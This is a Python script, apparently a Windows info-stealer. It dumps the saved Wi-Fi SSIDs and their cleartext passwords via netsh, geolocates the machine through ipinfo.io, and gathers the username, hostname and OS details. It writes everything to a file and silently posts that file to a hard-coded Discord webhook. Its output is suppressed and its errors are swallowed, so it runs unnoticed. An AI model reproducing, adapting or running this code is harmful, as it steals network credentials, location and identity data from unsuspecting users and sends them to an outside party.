import subprocess
from datetime import datetime
import requests
import platform
import socket
import getpass
import os
# print("Started")

try:
    current_time = datetime.now()
    formatted_time = current_time.strftime(
        "%d-%m-%Y--%H;%M;%S")  # 24-hour format
    # print(formatted_time)
except:
    None

failed = 0
failedintotal = 0


def format_table_row(label, value):
    row_format = "{:<36} | {:<}"
    return row_format.format(label, value)


try:
    profiles = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', 'key=clear']).decode(
        'cp850', errors='backslashreplace').split('\n')
    gotprofile1 = "True"
except:
    gotprofile1 = "False"

try:
    output_data = []
    for profile in profiles:
        failed = 0
        profile_parts = profile.split(':')

        if len(profile_parts) > 1:
            profile_name = profile_parts[1].strip()
        else:
            profile_name = None
        # print(f"Profile Name: {profile_name}")

        if profile_name is not None and profile_name != "":
            password_info = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', f'name={profile_name}', 'key=clear']).decode(
                'cp850', errors='backslashreplace').split('\n')

            password = ''
            for line in password_info:
                # print(line)
                if "Schlüsselinhalt" in line:
                    # print(line)
                    line_parts = line.split(':')
                    if len(line_parts) > 1:
                        password = line_parts[1].strip()
                        output_data.append((profile_name, password, failed))
                    else:
                        password = "Password not found."
                else:
                    failed += 1
                    failedintotal += 1
                    None
    gotprofiledata = "True"

except:
    gotprofiledata = "False"


try:
    response = requests.get('https://ipinfo.io')
    ipdata = response.json()
    gotipinfo = "True"
except:
    gotipinfo = "False"


try:
    # Operating System information
    os_name = platform.system()
    os_version = platform.release()
    # Hostname and IP Address
    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)
    # Username
    username = getpass.getuser()
    # Computer Name (Windows only)
    if os_name == 'Windows':
        computer_name = os.environ['COMPUTERNAME']
    else:
        computer_name = 'N/A'
    gotsysteminfo = "True"
except:
    gotsysteminfo = "False"


try:
    with open(f'{formatted_time}.txt', 'w') as f:
        try:
            f.write(format_table_row("Time on Input", formatted_time) + "\n")
            f.write(format_table_row("Got Profiles", gotprofile1) + "\n")
            f.write(format_table_row(
                "Got Profiles Passwords", gotprofiledata) + "\n")
            f.write(format_table_row("Got IP-Address Infos", gotipinfo) + "\n")
            f.write(format_table_row("Got SYSTEM-INFO", gotsysteminfo) + "\n")
        except:
            f.write("Couldn't gather Info over Checks.\n\n")

        f.write("\n")
        f.write("------------------------------------------------------------------------------------------------------------------------------------\n                                                      WIFI\n------------------------------------------------------------------------------------------------------------------------------------\n\n")
        try:
            for data in output_data:
                profile_name, password, failed = data
                f.write("SSID: {:<30} | Password: {:<50} | Failed Times: {:<}\n".format(
                    profile_name, password, failed))

            f.write("\nFailed times in total: {}\n\n\n".format(failedintotal))
        except:
            f.write("Couldn't gather Info over Wifi.\n\n")

        f.write("------------------------------------------------------------------------------------------------------------------------------------\n                                                   IP-ADDRESS\n------------------------------------------------------------------------------------------------------------------------------------\n\n")
        try:
            f.write(format_table_row(
                "IP Address (Request)", ipdata['ip']) + "\n")
            f.write(format_table_row("IP Address (OS)", ip_address) + "\n")
            f.write(format_table_row("Hostname", ipdata['hostname']) + "\n")
            f.write(format_table_row("City", ipdata['city']) + "\n")
            f.write(format_table_row("Region", ipdata['region']) + "\n")
            f.write(format_table_row("Country", ipdata['country']) + "\n")
            f.write(format_table_row(
                "Latitude and Longitude", ipdata['loc']) + "\n")
            f.write(format_table_row("Google Earth",
                    f"https://www.google.de/maps/place/{ipdata['loc']}\n"))
            f.write(format_table_row("Postal Code", ipdata['postal']) + "\n")
            f.write(format_table_row("Timezone", ipdata['timezone']) + "\n")
            f.write(format_table_row(
                "Internet Service Provider", ipdata['org']) + "\n")
            f.write("\n")

        except:
            f.write("Couldn't gather Info over IP-Address.\n\n")

        f.write("------------------------------------------------------------------------------------------------------------------------------------\n                                                    SYSTEM-INFO\n------------------------------------------------------------------------------------------------------------------------------------\n\n")
        try:
            f.write(format_table_row("Operating System", os_name) + "\n")
            f.write(format_table_row("Version", os_version) + "\n")
            f.write(format_table_row("Hostname", hostname) + "\n")
            f.write(format_table_row("Username", username) + "\n")
            f.write(format_table_row("Computer Name", computer_name) + "\n")
        except:
            f.write("Couldn't gather Info over System-Info.\n\n")
except:
    None


try:
    def send_file_to_discord_webhook(webhook_url, file_path):
        with open(file_path, 'rb') as file:
            payload = {
                'file': file
            }
            response = requests.post(webhook_url, files=payload)

        # if response.status_code == 200:
        # print('File sent successfully.')
        # else:
        # print('Failed to send the file. Status code:', response.status_code)

    # Replace 'WEBHOOK_URL' with your Discord webhook URL
    webhook_url = 'https://discord.com/api/webhooks/1130818781808181248/LHQkasiDbFP2GY6TX7SHyIEndO5o8TJHv8y8hA_ss2I8jxYL9he9zwOoTpphfeICZ90l'

    # Replace 'FILE_PATH' with the path to the file you want to send
    file_path = f'./{formatted_time}.txt'

    send_file_to_discord_webhook(webhook_url, file_path)
    discordwebhook = "True"
except:
    None
